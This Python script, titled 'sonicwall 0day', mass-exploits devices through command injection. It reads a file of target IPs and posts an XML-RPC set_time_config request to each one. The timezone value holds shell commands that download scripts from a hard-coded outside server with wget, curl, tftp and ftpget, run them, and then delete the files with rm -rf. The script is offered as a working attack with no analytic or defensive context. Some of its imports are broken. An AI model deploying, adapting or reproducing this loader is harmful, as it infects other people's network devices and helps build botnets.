#! python !#
# sonicwall 0day by wicked
import threading, sys, time, random, socket, re, os, struct, array, requests
from sys import stdout
from Threading import thread
from Queue import *
ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
p1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>set_time_config</methodName><params><param><value><struct><member><name>timezone</name><value><string>\"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://35.234.119.100/bins.sh; curl -O http://35.234.119.100/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 35.234.119.100 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 35.234.119.100; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 35.234.119.100 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://35.234.119.100/bins.sh; curl -O http://35.234.119.100/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 35.234.119.100 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 35.234.119.100; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 35.234.119.100 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"</string></value></member></struct></value></param></params></methodCall>"


def rtek(host):
    try:
		url = "http://" + host + ""
		requests.post(url, timeout=5, data=p1)
    except:
        pass
    return

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            sys.exit("Interrupted? (ctrl + c)")
    thread.join()
    return

if __name__ == "__main__":
    main()